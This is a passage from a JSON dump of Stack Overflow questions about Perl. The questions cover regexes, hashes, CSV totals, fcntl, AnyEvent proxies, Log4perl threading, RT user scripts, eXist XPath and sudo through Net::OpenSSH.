</p>\n\n<p>I don't actually know whether this is possible, so any input would be great.</p>\n"},{"tags":["perl","debugging","console","epic"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12646756,"title":"eclipse debug perl curses","body":"<p>I am writing a Perl program that uses curses for output and move the cursor, and color characters. Previously, when I was working under windows I use Komodo it was able to run an external console.</p>\n\n<p>Now I work in Linux environment and use eclipse + epic. If you try to just run the script, it uses the internal console eclipse, which is very cut. You can just run the script using external tool, but I'm interested to debug using external console window. Is this possible?</p>\n\n<p>Unfortunately, use of a File and /dev/pty/1 does not help in solving my problem.\nThe fact is that in this case it is impossible to get the characters introduced in the console through curses getch(). Always returned 1 instead code of pressed key.</p>\n"},{"tags":["regex","perl","pcre"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1004,"score":0,"question_id":2992133,"title":"extract word with regular expression","body":"<p>I have a string <code>1/temperatoA,2/CelcieusB!23/33/44,55/66/77</code> and I would like to extract the words <code>temperatoA</code> and <code>CelcieusB</code>. </p>\n\n<p>I have this regular expression <code>(\\d+/(\\w+),?)*!</code> but I only get the match <code>1/temperatoA,2/CelcieusB!</code></p>\n\n<p>Why?</p>\n"},{"tags":["perl","hash","key"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12674845,"title":"find biggest hash value regarding each key in perl","body":"<p>I have a file with this structure</p>\n\n<pre><code>&gt;test1\nMATRTQARGA \n&gt;test2\nMRIIEGKLQLQG\n&gt;test1\n MATRTQARGAVVELLYAFESGNEEIKKIASSML\n</code></pre>\n\n<p>in the result I want</p>\n\n<pre><code>&gt;test2\nMRIIEGKLQLQG\n&gt;test1\nMATRTQARGAVVELLYAFESGNEEIKKIASSML\n</code></pre>\n\n<p>I was thinking about a <strong>hash structure</strong> which keys are the lines with > and the next line after each >line would be the value then for each key I some how print the string with longest length , but since hash structures can not have duplicate keys I don't know what to do </p>\n"},{"tags":["linux","perl","asynchronous","fcntl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":76,"score":2,"question_id":12640993,"title":"how to use O_ASYNC and fcntl in perl?","body":"<p>i want to use O_ASYNC option and when the pipe can read , \nthe SIGIO's handler will run .</p>\n\n<p>but the following code are not work . any one can help me ?</p>\n\n<pre><code>#!/bin/env perl\nuse Fcntl;\n $SIG{IO}= sub {\n   print \"catch SIGIO!\\n\";\n};\n\nmy $flags=0;\n\nopen(FH,\"-|\",\"sleep 4 ;echo aaa\") or die \"$!\";\n\nfcntl(FH,F_GETFL,$flags) or die \"$!\";\nfcntl(FH,F_SETFL,$flags | O_NONBLOCK | O_ASYNC) or die \"$!\";\n\nsleep(5);\n\nprint  \"complete\\n\";\n</code></pre>\n\n<p>my perl version is 5.16.1 , operation system is Redhat 5u4 ,kernel 2.6.18, x86_64</p>\n"},{"tags":["perl","hashcode"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":149,"score":-1,"question_id":5868430,"title":"program that takes a string as input from user from command line and printing only list of unique characters","body":"<p>How to parse the string's individual character for eg \" =-. lajadsfdddll ooo532333 ksfoiww0etu - \" /.> W#H^*!@#~ nsa@\". and add each individual character into hash and then count as ohw many times each character has apeared and the only unique character.</p>\n"},{"tags":["perl","http","asynchronous","proxy","anyevent"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12671099,"title":"Perl AnyEvent::HTTP request using Proxy fails","body":"<p>I tried using the perl module AnyEvent::HTTP to make asynchronous HTTP requests by following this post: <a href=\"http://www.windley.com/archives/2012/03/asynchronous_http_requests_in_perl_using_anyevent.shtml\" rel=\"nofollow\">http://www.windley.com/archives/2012/03/asynchronous_http_requests_in_perl_using_anyevent.shtml</a></p>\n\n<p>However, I'm not able to get it working through proxies...</p>\n\n<pre><code>    my $request;\n    my $host = '&lt;userid&gt;:&lt;pswd&gt;@&lt;proxyip&gt;';\n    my $port = '&lt;proxyport&gt;';\n    my $headers = { ...                        \n                    'Accept-Language'=&gt; 'en-us,en;q=0.5',\n                    'Accept-Charset'=&gt; 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',\n                    'Keep-Alive' =&gt; 300,\n                    };\n\n    $request = http_request(\n      GET =&gt; $url,\n      timeout =&gt; 120, # seconds\n      headers =&gt; $headers,\n      proxy =&gt; [$host, $port],\n      mymethod\n   );\n\n$cv-&gt;end;\n$cv-&gt;recv;    \n</code></pre>\n\n<p>I get the following error for the above code (after substituting with authentication details for the proxy)</p>\n\n<pre><code>   { \n      'Reason' =&gt; 'No such device or address',\n      'URL' =&gt; 'www.google.com',\n      'Status' =&gt; 595\n    };\n</code></pre>\n\n<p>Without the proxy argument of the request, it works. From the CPAN page <a href=\"http://search.cpan.org/~mlehmann/AnyEvent-HTTP-2.14/HTTP.pm\" rel=\"nofollow\">http://search.cpan.org/~mlehmann/AnyEvent-HTTP-2.14/HTTP.pm</a>, </p>\n\n<p>595 - errors during connection etsbalishment, proxy handshake</p>\n\n<p>Please help me identify the problem with this code. Thanks!</p>\n"},{"tags":["perl","logging","asynchronous","perl-module"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":166,"score":0,"question_id":9269334,"title":"perl: Will Log::Log4perl work in a multi-threaded environment?","body":"<p>I'm using logging vai Log::Log4perl in my perl script; I'm wondering if making multiple calls to write to the same log object will cause incorrect / erroneous behavior. </p>\n\n<p>I'm using a Appender::File to write out the log in the following manner:</p>\n\n<pre><code>$log-&gt;info(\"Launching commands...\");\nforeach my $param (@params) {\n    push @thread_handles, async {\n        system(\"$param\");\n        $log-&gt;info(\"$param COMPLETE\");\n        logstatus($?);\n    };\n}\n\n$_-&gt;join() foreach @thread_handles;\n$log-&gt;info(\"Commands completed...\");\n</code></pre>\n"},{"tags":["perl","bash","rt"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":250,"score":3,"question_id":12272084,"title":"How can I run a perl script from bash using command line arguments?","body":"<p>I am trying to create a script to batch mark a group of users as privileged in RT. I found a script on the RT wiki for adding users to a group and giving them the privileged status, then removed the bits of it to do with adding to a group. The perl script I have remaining is:</p>\n\n<pre><code>#!/usr/bin/perl\n# Usage: ./rt_set_privileged.pl &lt;username&gt;\n\nuse strict;\nuse lib \"/var/www/ticket.ourcompany.com/lib\";\nuse RT;\nuse RT::User;\nuse RT::Interface::CLI;\n\nRT::LoadConfig();\nRT::Init();\n\n# Create RT User Object\nmy $user = new RT::User($RT::SystemUser);\n\n# Instantiate the user object with the user passed as parameter\nmy $usertoadd = $ARGV[0];\n$user-&gt;Load( $usertoadd );\n\n# Set the privileged flag (1=privileged, 0=unprivileged)\n$user-&gt;SetPrivileged(1);\n\nexit 1\n</code></pre>\n\n<p>I have the users in a file, one username per line.\nI don't know perl as of yet, so I tried to create a little bash script to loop through the file and run the perl script once per name. The Bash script as it looks right now:</p>\n\n<pre><code>#!/bin/bash\n\ntouch commands.sh\ncat usernames.txt | while read LINE ; do\n        N=$((N+1))\n        echo /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\" &gt;&gt; commands.sh\n        /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        perl /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        perl -w /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        eval /home/chris/RT/bin/rt_set_privileged.pl \\\"$LINE\\\"\n        perl \"/home/chris/RT/bin/rt_set_privileged.pl $LINE\"\ndone\necho \"Processed $N users\"\n</code></pre>\n\n<p>As you can see I have tried quite a few methods to get the command to run, but to no avail. The annoying thing is, I can take any of the commands from the commands.sh file afterwards and paste them straight into the terminal without a problem, this works fine. When they are run through the bash script though, I just get a bunch of these messages:</p>\n\n<pre><code>[Tue Sep  4 07:43:56 2012] [critical]: _AddMember called with a parameter that's not an integer. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:912)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value $principal in pattern match (m//) at /var/www/ticket.ourcompany.com/lib/RT/Group.pm line 970. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:968)\n[Tue Sep  4 07:43:58 2012] [error]: Group::HasMember was called with an argument that isn't an RT::Principal or id. It's (undefined) (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:973)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value $principal in pattern match (m//) at /var/www/ticket.ourcompany.com/lib/RT/Group.pm line 970. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:968)\n[Tue Sep  4 07:43:58 2012] [error]: Group::HasMember was called with an argument that isn't an RT::Principal or id. It's (undefined) (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:973)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value in concatenation (.) or string at /var/www/ticket.ourcompany.com/lib/RT/User.pm line 341. (/var/www/ticket.ourcompany.com/lib/RT/User.pm:341)\n[Tue Sep  4 07:43:58 2012] [critical]: User  is neither privileged nor unprivileged. something is drastically wrong. (/var/www/ticket.ourcompany.com/lib/RT/User.pm:341)\n[Tue Sep  4 07:43:58 2012] [warning]: Use of uninitialized value $new_member in pattern match (m//) at /var/www/ticket.ourcompany.com/lib/RT/Group.pm line 911. (/var/www/ticket.ourcompany.com/lib/RT/Group.pm:911)\n</code></pre>\n\n<p>suggesting that the command is being run without any parameters.  At this point I could have actually run the command once for each user in the time I have been trying to solve it, can anyone help?</p>\n"},{"tags":["perl","parsing","csv"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":136,"score":1,"question_id":12654453,"title":"Perl on Hash and Array References","body":"<p>I have a csv file, <code>transcation.csv</code>, which looks like this:</p>\n\n<pre><code>TransactionID,Date,AccNum,Type,Amt  \n657520,02-07-1999,016901581432,Debit,16000  \n657524,02-07-1999,016901581432,Debit,13000  \n657538,09-07-1999,016901581432,Credit,11000  \n657548,18-07-1999,016901581432,Credit,15500  \n657519,02-07-1999,016901581433,Debit,12000  \n657523,02-07-1999,016901581433,Credit,11000  \n657529,03-07-1999,016901581433,Debit,15000  \n657539,10-07-1999,016901581433,Credit,10000  \n657541,11-07-1999,016901581434,Debit,12000  \n657525,03-07-1999,016901581434,Debit,15000  \n657533,05-07-1999,016901581434,Credit,12500  \n</code></pre>\n\n<p>I am supposed to read the data from <code>transaction.csv</code> and store it in a hash. And then pass the hash and list of Account numbers to the function, and then make the function to calculate total Debit Amount and Credit Amount of the listed accounts using the data in the hash.</p>\n\n<p>This is my code:</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy %banks;\n&amp;arrhas_banks(\\%banks);\nmy @accnum = qw(016901581432 016901581434);\nhasarr_banks(\\%banks,\\@accnum);\n\nsub arrhas_banks\n{\n  my $banks = shift;\n  open(FH,\"&lt;transaction.csv\") or die \"Could not open 'transaction.csv' $!\\n\";\n  while (my $data=&lt;FH&gt;) \n  {\n    chomp($data);\n    my @records = split \",\", $data;\n    $banks-&gt;{$records[0]} =\n      { 'AccNum' =&gt; $records[2], 'Type' =&gt; $records[3], 'Amt' =&gt; $records[4] };\n  }\n  close(FH);\n}\n\nsub hasarr_banks {\n  my ($banks, $accnum) = @_;\n  foreach my $id (keys %{$banks}) {\n    my $answer;\n    foreach my $num (@{$accnum}) {\n      if($banks-&gt;{$id}{'AccNum'} == $num) {\n        $answer = 1;\n      }\n    }\n    if($answer) {\n      my $type = $banks-&gt;{$id}{'Type'};\n      $total{$accnum}{$type} += $banks-&gt;{$id}{'Amt'};\n    }\n  }\n  foreach my $no (@{$accnum}} { \n    print \"Debit amount of $no is $total{$accnum}{'Debit'}\";\n    print \"Credit amount of $no is $tot{$accnum}{'Credit'}\";\n  }\n}\n</code></pre>\n\n<p>I am supposed to produce output like this:</p>\n\n<pre><code>Debit amount of 016901581432 is 29000  \nCredit amount of 016901581432 is 26500  \nDebit amount of 016901581434 is 27000  \nCredit amount of 016901581434 is 12500    \n</code></pre>\n\n<p>But I am getting output like this:</p>\n\n<pre><code>Debit amount of 016901581432 is 56000    \nCredit amount of 016901581432 is 39000  \nDebit amount of 016901581434 is 56000  \nCredit amount of 016901581434 is 39000  \n</code></pre>\n\n<p>What am I doing wrong?</p>\n\n<hr>\n\n<pre><code>#!/usr/bin/perl\n\nmy %banks;\n&amp;arrhas_banks(\\%banks);\nmy @accnum = qw(016901581432 016901581434);\nhasarr_banks(\\%banks,\\@accnum);\n\nsub arrhas_banks\n{\n  my $banks = shift;\n  open(FH,\"&lt;transaction.csv\") or die \"Could not open 'transaction.csv' $!\\n\";\n  while (my $data=&lt;FH&gt;) \n  {\n    chomp($data);\n    my @records = split \",\", $data;\n    $banks-&gt;{$records[0]} =\n      { 'AccNum' =&gt; $records[2], 'Type' =&gt; $records[3], 'Amt' =&gt; $records[4] };\n  }\n  close(FH);\n}\n\nsub hasarr_banks {\n  my ($banks, $accnum) = @_;\n  foreach my $id (keys %{$banks}) {\n    my $answer;\n    foreach my $num (@{$accnum}) {\n      if($banks-&gt;{$id}{'AccNum'} == $num) {\n        $answer = 1;\n      }\n    }\n    if($answer) {\n      my $type = $banks-&gt;{$id}{'Type'};\n      $total{ $banks-&gt;{$id}{'AccNum'} }-&gt;{$type} += $banks-&gt;{$id}{'Amt'};\n    }\n  }\n  foreach my $no (@{$accnum}) { \n    print \"Debit amount of $no is $total{$accnum}{'Debit'}\";\n    print \"Credit amount of $no is $total{$accnum}{'Credit'}\";\n  }\n}                      \n</code></pre>\n\n<p>No output yet. Still going wrong?</p>\n"},{"tags":["perl","iptables"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12309669,"title":"Iptables rules validation","body":"<p>I have a <code>perl</code> script that generates a shell script that will later be loaded by <code>iptables</code> on a remote machine. The data input for the perl script comes from a config file, where I can specify all kind of parameters for each rule. </p>\n\n<p>The problem is about validation, <strong>How would you validate the whole set of rules without the ability of executing it?</strong> </p>\n\n<p>I have searched on CPAN and the closest solution was <a href=\"http://search.cpan.org/~phillips/IPTables-Rule-0.01/lib/IPTables/Rule.pm\" rel=\"nofollow\">IPTables::Rule</a> but it only validates some of the restrictions when it generates the rule. I can't use IPTables::IPv4 because it interacts directly with the host iptables.</p>\n"},{"tags":["perl","xpath","exist"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":212,"score":2,"question_id":6098498,"title":"how to query eXist using XPath?","body":"<p>I decided to use eXist as a database for an application that I am writing in Perl and \nI am experimenting with it. The problem is that I have stored a .xml document with the following structure</p>\n\n<pre><code>&lt;foo-bar00&gt;\n    &lt;perfdata datum=\"GigabitEthernet3_0_18\"&gt;\n        &lt;cli cmd=\"whatsup\" detail=\"GigabitEthernet3/0/18\" find=\"\" given=\"\"&gt;\n            &lt;input_rate&gt;3&lt;/input_rate&gt;\n            &lt;output_rate&gt;3&lt;/output_rate&gt;\n        &lt;/cli&gt;\n    &lt;/perfdata&gt;\n    &lt;timeline&gt;2011-5-23T11:15:33&lt;/timeline&gt;\n&lt;/foo-bar00&gt;\n</code></pre>\n\n<p>and it is located in the \"<code>/db/LAB/foo-bar00/2011/5/23/11_15_33.xml</code>\" collection.</p>\n\n<p>I can successfully query it, like</p>\n\n<pre><code>my $xquery = 'doc(\"/db/LAB/foo-bar00/2011/5/23/11_15_33.xml\")' ;\n</code></pre>\n\n<p>or $xquery can be equal to\n= doc(\"/db/LAB/foo-bar00/2011/5/23/11_15_33.xml\")/foo-bar00/perfdata/cli/data(output_rate)\nor\n= doc(\"/db/LAB/foo-bar00/2011/5/23/11_15_33.xml\")/foo-bar00/data(timeline)</p>\n\n<pre><code>my ($rc1, $set) = $eXist-&gt;executeQuery($xquery) ;\nmy ($rc2, $count) = $eXist-&gt;numberOfResults($set) ;\nmy ($rc3, @data) = $eXist-&gt;retrieveResults($set) ;\n$eXist-&gt;releaseResultSet($set) ;\nprint Dumper(@data) ;\n</code></pre>\n\n<p>And the result is :</p>\n\n<pre><code>$VAR1 = {\n  'hitCount' =&gt; 1,\n  'foo-bar00' =&gt; {\n    'perfdata' =&gt; {\n      'cli' =&gt; {\n        'given' =&gt; '',\n        'detail' =&gt; 'GigabitEthernet3/0/18',\n        'input_rate' =&gt; '3',\n        'cmd' =&gt; 'whatsup',\n        'output_rate' =&gt; '3',\n        'find' =&gt; ''\n      },\n      'datum' =&gt; 'GigabitEthernet3_0_18'\n    },\n    'timeline' =&gt; '2011-5-23T11:15:33'\n  }\n};\n</code></pre>\n\n<p>---> Given that I know the xml document that I want to retrieve info from.\n---> Given that I want to retrieve the timeline information.</p>\n\n<p>When I am writing :</p>\n\n<pre><code>my $db_xml_doc = \"/db/LAB/foo-bar00/2011/5/23/11_15_33.xml\" ;\nmy ($db_rc, $db_datum) = $eXist-&gt;queryXPath(\"/foo-bar00/timeline\", $db_xml_doc, \"\") ;\nprint Dumper($db_datum) ;\n</code></pre>\n\n<p>The result is :</p>\n\n<pre><code>$VAR1 = {\n  'hash' =&gt; 1717362942,\n  'id' =&gt; 3,\n  'results' =&gt; [\n    {\n      'node_id' =&gt; '1.2',\n      'document' =&gt; '/db/LAB/foo-bar00/2011/5/23/11_15_33.xml'\n    }\n  ]\n};\n</code></pre>\n\n<p><em><strong></em>**<em>*</em>*</strong> **The question is : How can I retrieve the \"timeline\" info ? \nSeems that the \"node_id\" variable (=1.2) can points to the \"timeline\" info, but how can I use it ?**</p>\n\n<p>Thank you.</p>\n"},{"tags":["perl","registry"],"answer_count":3,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":2323,"score":1,"question_id":1621053,"title":"Perl's TieRegistry and Windows Server 2008 R2","body":"<p>We have a Perl program that ran well on all Windows platforms so far.</p>\n\n<p>When we tried it on the newly released Windows Server 2008 R2, it stopped working. Investigation revealed that the problem is that calls to read registry values using TieRegistry returned undefined values.</p>\n\n<p>Is this a known problem? Did anyone run into a problem accessing the registry on Windows Server 2008 R2 using TieRegistry?\nI'm running the program as administrator, so I don't think it is permission problems. The program works great and read the registry correctly on Windows 7 and Vista.</p>\n\n<p>A sample script I wrote to access the registry also fail:</p>\n\n<pre><code>use Win32::TieRegistry(Delimiter=&gt;'\\\\');\nmy $reg = \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\TEST\\\\Value1\";\nmy $val = $Registry-&gt;{$reg};\nprint \"val: \".$val.\"\\n\";\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n\n<p>Thanks,\nsplintor </p>\n"},{"tags":["perl","apache","ssh","cgi","ssh-keys"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":690,"score":1,"question_id":7769280,"title":"How do I program a CGI script to execute a remote script over ssh and display data from the remote execution?","body":"<p>I have this particular case where I have to place the HTML pages and CGI scripts on ServerA and the CGI scripts will have to invoke Perl scripts on ServerB which will fetch data from a DB and the HTML pages on ServerA are to display the data.</p>\n\n<p>I am successful at remotely triggering the perl script but am unable to decide what the best way is to get the data from ServerB back to ServerA and have it displayed with this architecture?</p>\n\n<p>I considered the following:\nServerB exports data to a flatfile which is transferred back using scp to ServerA. The scp can be configured in the perl file on serverB.</p>\n\n<p><strong>Question1:</strong> How do I get the CGI on ServerA to wait until ServerB returns data. How do I handle error cases where data is not returned or when input parameters passed to ServerB ae incorrect?</p>\n\n<p><strong>Question2:</strong> Is there a better way to program around this requirement?                            </p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":167,"score":-5,"question_id":5657390,"title":"Grab the text by Perl","body":"<p>Here it a text file.</p>\n\n<pre><code>BEGIN:-----------------------------------------------\ntest 1\ntest 2 %%%%%%%%%%  TEST  TEST TEST\ntest 3\nEND:\n</code></pre>\n\n<p>I need to grab the text between the tags <code>BEGIN:</code> and <code>END:</code>. </p>\n\n<p>How can I do that in two different ways with Perl?</p>\n"},{"tags":["perl","script"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":257,"score":-4,"question_id":9323070,"title":"Perl script to compare two files","body":"<p>I am new to Perl, and I need to write a Perl script to compare two files which shows the matched and unmatched content in the output file. I am supposed to pass the those two files as parameters.</p>\n\n<p>How can I do this?</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12258032,"title":"How to pass variable to regular expression in PERL","body":"<p>Following program is not working. I am not able to replace word with new word using variable (User input)</p>\n\n<pre><code>#Perl program that replace word with given word in the string\n$str=\"\\nThe cat is on the tree\";\nprint $str;\nprint \"\\nEnter the word that want to replace\";\n$s1=&lt;&gt;;\nprint $s1;\nprint \"\\nEnter the new word for string\";\n$s2=&lt;&gt;;\nprint $s2;\n$str=~ tr/quotemeta($s1)/quotemeta($s2)/;\nprint $str\n</code></pre>\n"},{"tags":["perl","development-environment"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12666207,"title":"What servers are suitable for Perl on a development box?","body":"<p>I'm maintaining a simple web site written in Perl in my copious free time, and I don't want do my coding on the live website any more, instead checking if the changes work on a local machine first.</p>\n\n<p>As far as I can tell, the web site runs on apache.</p>\n\n<p>Should I install apache on my local machine, or are there simpler (but well documented!) options more suited to a development box?</p>\n\n<p>Related question: <a href=\"http://stackoverflow.com/questions/2107356/how-can-i-run-perl-on-web-servers\">How can I run Perl on web servers?</a> , but seems to be talking about a production box, not a development box.</p>\n"},{"tags":["arrays","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":12241423,"title":"how perl array works $\"","body":"<p>I am confused about the outcome of this code.  </p>\n\n<pre><code>my @lines;\nfor (my $count = 0; $count &lt; 3; $count++) {\n\n    print \"Give me input again \";\n    chomp (my $line = &lt;STDIN&gt;);\n    $lines[$count] = $line;\n}\n\n$\" = \"|\";\nprint \"@lines\\n\";\n</code></pre>\n\n<p>When I run the code, how does this:  <code>$\" = \"|\";</code> work?\nThe results are One|Two|Three. How does the code work so that it puts \"|\" between each input?</p>\n"},{"tags":["perl","graphics"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12658086,"title":"No event loop graphics in perl plus XWindows?","body":"<p>On the Apple II BASIC in the 1980s, you would use \"HGR\", to get to a screen, \"HCOLOR\" would set a color, and \"HPLOT\" would plot points. You could also manipulate the screen byte data, and you wouldn't have to hand off program control to any event handler. This ridiculously rudimentary functionality seems to be missing today from every language and every library.</p>\n\n<p>So I wrote a small library to do this in C using the XWindows API: HGR(x,y) puts up an XWindow, HCOLOR(i) sets the color, and HPLOT(i,j) plots a point, plus you extract the window's bitmap and can modify it and display the modified thing. This was not straightforward and I don't want to go through it again.</p>\n\n<p>I am using Perl for some things now, and I need such a tool for Perl, something where you can call a subroutine that preferrably returns without spawning a new thread, having output a window, where you can add graphical stuff to the window, and query the events when your program feels like it. This is the functionality of 1980s BASIC, so it shouldn't be hard. But the tools I saw didn't do it:</p>\n\n<ul>\n<li>GD: As far as I could see, this makes graphics files, not graphics windows. It seems you need to pipe it to another program.</li>\n<li>Gtk2: I have to fork out a separate thread to catch the events, otherwise it won't display the window. I don't want to fork anything, and I mostly don't care about any events, not unless I specifically ask to see the stuff piled up in the queue later.</li>\n<li>Qt: Here you are also expected to hand off control to the event handler, no handing off, no display. In the C++ version, I could get Qt to display and draw without a handoff.</li>\n<li>PerlTk: Again with the stupid handoff.</li>\n<li>OpenGL: Here, I don't know how to catch XWindows events, like a keypress, when I feel like looking at what happened.</li>\n</ul>\n\n<p>Does anyone know how to put up an XWindow from a running app, without forking out a GUI app process, where you can draw primitive things in the window like points and lines, and where you can query your windows' events on your own schedule? I briefly looked at the XWindows API for Perl, it's as horrendous as C, and interfacing the C code with Perl is also horrendous. If necessary, I'll do it. But maybe not. Is there an HGR for Perl already?</p>\n\n<p>If you are wondering what I mean, no event loop graphical library, see <a href=\"http://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;ved=0CCIQFjAA&amp;url=http%3A%2F%2Fpdf.aminer.org%2F000%2F590%2F956%2Fa_c_based_graphics_library_for_cs.pdf&amp;ei=L89nUL2NAuLm0QHwsoH4BQ&amp;usg=AFQjCNGuUNgL_rD0o7YdV_wWqZHfoKvMKg&amp;sig2=q5S2AeWmMH77wZVsODZWfA\" rel=\"nofollow\">this linked paper</a>, which unfortunately is for C. Such a thing is extremely useful for scientific stuff, outside of introductory programming classes.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":118,"score":-7,"question_id":12662924,"title":"Perl on Modules-Inheritance,Polymorphism","body":"<p>This is a question from object oriented Perl. I am supposed to design a module:<br>\n1)Store the values<br>\n2)Calculate the Total, Mean, Count.<br>\nI am supposed to find a code which relates method overriding or polymorphism or inheritance in Object Oriented Perl.</p>\n\n<p>My code is like this:</p>\n\n<pre><code>package Stats;\nuse strict;\nuse warnings;\nsub new {\n  my $class = @_;\n  my $self = {};\n  bless $self, $class;\n  $self-&gt;clear();\n  return $self;\n}\nsub clear {\n  my $self = $_[0];\n  $self-&gt;{'numlist'} = undef;\n  $self-&gt;{'x_sum'} = 0;\n  $self-&gt;{'x2_sum'} = 0;\n}\nsub addValue {\n  my $self = $_[0];\n  my $num = $_[1];\n  if (defined $num) {\n    push @{$self-&gt;{'numlist'}}, $num;\n    $self-&gt;{'x_sum'} += $num;\n    $self-&gt;{'x2_sum'} += $num**2;\n  }\n}\nsub getTotal {\n  my $self = $_[0];\n  return $self-&gt;{'x_sum'};\n}\nsub getMean {\n  my $self = $_[0];\n  my @numlist = @{$self-&gt;{'numlist'}};\n  if (!@numlist) { return 0; }\n  return $self-&gt;getTotal()/@numlist;\n}\nsub getValueList {\n  my $self = $_[0];\n  return @{$self-&gt;{'numlist'}};\n}\n1;\n\n\nsub results {\nmy $obj = new Stats(13,4,56,43,33);\nprint \"Number of values: \", scalar($obj-&gt;getValueList()), \"\\n\";\nprint \"Total: \", $obj-&gt;getTotal(), \"\\n\";\nprint \"Mean: \", $obj-&gt;getMean(), \"\\n\";\n}\n</code></pre>\n\n<p>Where am I going wrong?</p>\n"},{"tags":["perl","sudo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12649673,"title":"perl sudo using Net::Openssh not working","body":"<p>I am using salvas' Net::Openssh module, but not able to figure how to use sudo. i hav etried following, but it is not working...</p>\n\n<p>there is nothing printed in results. single word commands like ls pwd are also not producing anything.</p>\n\n<p>version of sudo on target system:</p>\n\n<pre><code>$ /usr/local/bin/sudo -V\nCU Sudo version 1.5.7p2\n\n$ /usr/local/bin/sudo -h\nCU Sudo version 1.5.7p2\nusage: /usr/local/bin/sudo -V | -h | -l | -v | -k | -H | [-b] [-p prompt] [-u username/#uid] -s | &lt;command&gt;\n</code></pre>\n\n<p>since CU sudo does not allow more than 1 option at a time, i supply -k before supplying the command.</p>\n\n<p>please note that this sudo version does not have -S switch to pass password using stdin. so it expects password from terminal. can u pl help more. thx.</p>\n\n<pre><code>            $ssh-&gt;system(\"$sudo_path -k\");\n            my @output = $ssh-&gt;capture({tty =&gt; 1,\n                           stdin_data =&gt; \"$PASS\"},\n                          $sudo_path,\n                          \"-p\",'', \"$cmd\");\n            print \"  result=@output \\n\";\n</code></pre>\n\n<p>OR</p>\n\n<pre><code>            $ssh-&gt;system(\"$sudo_path -k\");\n            my @output = $ssh-&gt;capture({stdin_data =&gt; \"$PASS\"},\n                          $sudo_path,\n                          \"-p\",'', \"$cmd\");\n            print \"  result=@output \\n\";\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":112,"score":3,"question_id":12660764,"title":"Regex for removing percentage","body":"<p>Hi I would really appreciate some help in forming a regex that removes a percentage from the end of a string:</p>\n\n<pre><code>Film name (2009) 58%  -&gt;  Film name (2009)\nFilm name (2010) 59%  -&gt;  Film name (2010)\n</code></pre>\n\n<p>The string may or may not have the bracketed year. Before the bracketed year, the film name may be alphanumeric and have multiple words.</p>\n\n<p>I am using 'bulk rename utility' so am looking to fill in the 'match' and 'replace' fields.</p>\n\n<p>The best I could come up with was:</p>\n\n<pre><code>([A-Z][a-z]*) \\((\\d*)\\) (\\d*\\%) --&gt;  \\1 (\\2)\n</code></pre>\n\n<p>though this only seemed to work with single word film names, and lost the brackets so I had to re-add!</p>\n\n<p>I've google and every time I try possible expressions it doesn't work in the 'bulk rename utility' which I believe is based on pcre (<a href=\"http://www.bulkrenameutility.co.uk/Download.php\" rel=\"nofollow\">Bulk Rename Utility</a>).</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":71,"score":-3,"question_id":12618458,"title":"How to display â symbol in perl","body":"<p>I am parsing an HTML file and if <code>&amp;#8734;</code> occurs which is displayed as <code>â</code> in html page.</p>\n\n<p>In perl when I try to take the data from the tags and when <code>&amp;#8734;</code> occurs want to display  <code>â</code> this symbol in perl through print STDERR. </p>\n\n<p>How can I achieve this?</p>\n"},{"tags":["forms","perl","catalyst"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":11928812,"title":"catalyst html::formhandler pass form value","body":"<p>I'm using <a href=\"https://metacpan.org/module/HTML::FormHandler\" 